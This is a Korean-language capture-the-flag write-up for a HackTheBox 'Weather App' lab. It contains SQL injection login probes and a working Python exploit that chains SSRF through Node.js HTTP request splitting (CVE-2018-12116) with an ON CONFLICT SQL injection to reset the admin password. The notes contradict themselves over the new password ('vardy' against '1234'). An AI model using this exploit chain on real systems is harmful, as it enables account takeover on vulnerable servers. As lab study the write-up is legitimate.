ROOM: Weather App
TARGET: 94.237.57.211:37932

http://94.237.57.211:37932/
Sejong 날씨 알려주는 webpage





gobuster dir -u http://94.237.57.211:37932/ -w /usr/share/wordlists/dirb/common.txt -x php,txt
/login                (Status: 200) [Size: 1657]
/Login                (Status: 200) [Size: 1657]
/register             (Status: 200) [Size: 1663]
/static               (Status: 301) [Size: 179] [--> /static/]

/Login                (Status: 200) [Size: 1657]
로그인페이지
/register             (Status: 200) [Size: 1663]
회원가입 페이지
회원가입 로그인 둘다 안됨
sql injection 시도 
' or 1=1 --
1234
'or 1=1 #
1234

해봤으나 실패

서비스 코드를 분석 시도



/routes/index.js 코드

router.post('/register', (req, res) => {

	if (req.socket.remoteAddress.replace(/^.*:/, '') != '127.0.0.1') {
		return res.status(401).end();
	}

	let { username, password } = req.body;

	if (username && password) {
		return db.register(username, password)
			.then(()  => res.send(response('Successfully registered')))
			.catch(() => res.send(response('Something went wrong')));
	}

	return res.send(response('Missing parameters'));
});


register 페이지에서 post보내는 요청 > 회원가입 처리를 보니 
로컬에서 요청하는게 아니면 불가능 하게 해둠 >> ssrf




router.post('/login', (req, res) => {
	let { username, password } = req.body;

	if (username && password) {
		return db.isAdmin(username, password)
			.then(admin => {
				if (admin) return res.send(fs.readFileSync('/app/flag').toString());
				return res.send(response('You are not admin'));
			})
			.catch(() => res.send(response('Something went wrong')));
	}
	
	return re.send(response('Missing parameters'));
});
만약 유저가 어드민으로 로그인하게되면 플래그 출력

/package.json 코드

"nodeVersion": "v8.12.0",
nodejs 버전이 구버전이다 


/helpers/WeatherHelper.js
async getWeather(res, endpoint, city, country) {

        // *.openweathermap.org is out of scope
        let apiKey = '10a62430af617a949055a46fa6dec32f';
        let weatherData = await HttpHelper.HttpGet(`http://${endpoint}/data/2.5/weather?q=${city},${country}&units=metric&appid=${apiKey}`); 
      
내부 코드를 보면 실제로 apikey를 통해서 외부사이트에 요청을 보내는중
저 주소를 내가 원하는 방식으로 수정해서 내가 사이트에 요청을 보내면 될거같다


구글에 nodejs ssrf 취약점 검색

Node.js v8 버전에서 SSRF 취약점이 존재하며, 특히 HTTP request splitting을 이용한 공격이 가능했습니다. 이 취약점은 특정 버전(v6.x, v8.x)에서 발견되었고, 이후 업데이트를 통해 수정되었습니다. 
SSRF (Server-Side Request Forgery) 란?
SSRF는 서버 측에서 공격자가 의도한 다른 서버로 요청을 보내도록 조작하는 공격 기법입니다. 공격자는 서버의 권한을 이용하여 내부 시스템이나 민감한 데이터에 접근할 수 있습니다. 
Node.js v8에서의 SSRF 취약점:
Node.js v8 버전에서는 HTTP request splitting 기법을 이용한 SSRF 공격이 가능했습니다. 이는 Node.js가 HTTP 요청 헤더를 처리하는 과정에서 특정 형식의 유효하지 않은 유니코드 데이터를 포함한 요청을 처리할 때 발생했습니다

CVE-2018-12116
https://jaeseokim.dev/Security/nodejs-HTTP-request-splitting%EC%9D%84-%EC%9D%B4%EC%9A%A9%ED%95%9C-SSRF-%EC%B7%A8%EC%95%BD%EC%A0%90featNullCon2020-splitsecond-WriteUp/


CVE-2018-12116
대상 : Node.js: All versions prior to Node.js 6.15.0 and 8.14.0

위협 : HTTP request splitting

Node.Js가 정상적이지 않은 유니코드 데이터를 path 옵션으로 HTTP request을 받아들이면 그 데이터는 다른 데이터로 변환되어 작동하게 됩니다. 이점을 이용하여 HTTP request split이 실행 됩니다.

ex)

\u{01F436} = 🐶 | server -> \x36 = 6

\u{010D} = č | server -> \x0d = \r

\u{010A} = Ċ | server -> \x0a = \n

payload구상

GET /data/2.5/weather?q=vardy HTTP/1.1
HOST: 127.0.0.1

POST /register HTTP/1.1
HOST: 127.0.0.1
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 126

username=admin&password=asd') ON CONFLICT (username) DO UPDATE SET password='vardy'-- 
#admin 패스워드 1234변경

GET /


//

exploit.py작성

import requests

url = 'http://94.237.57.211:37932/api/weather'


#let query = `INSERT INTO users (username, password) VALUES ('${user}', '${pass}')`;
#INSERT INTO users (username, password) VALUES ('admin', 'vardy') ON CONFLICT (username) DO UPDATE SET password = 'vardy';--')


sqli = "username=admin&password=asd%27%29+ON+CONFLICT+%28username%29+DO+UPDATE+SET+password=%27vardy%27--"
#sqli = sqli.replace(' ','%20')
cl = str(len(sqli))

exploit = ''' HTTP/1.1
HOST: 127.0.0.1


POST /register HTTP/1.1
HOST: 127.0.0.1
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: {}

{}

GET /'''.format(cl,sqli)

print(exploit)

exploit = exploit.replace(' ', '\u0120')
exploit = exploit.replace('\n','\u010D\u010A')

print(exploit)

data = {'endpoint': '127.0.0.1', 'city': 'vardy', 'country':exploit}

response = requests.post(url, data=data)

print(response.status_code)
print(response.text)

python exploit.py

로그인페이지 접속 
admin
1234
로그인

flag 출력
HTB{w3lc0m3_t0_th3_p1p3_dr34m}

참고
https://vardy.tistory.com/267
https://jaeseokim.dev/Security/nodejs-HTTP-request-splitting%EC%9D%84-%EC%9D%B4%EC%9A%A9%ED%95%9C-SSRF-%EC%B7%A8%EC%95%BD%EC%A0%90featNullCon2020-splitsecond-WriteUp/

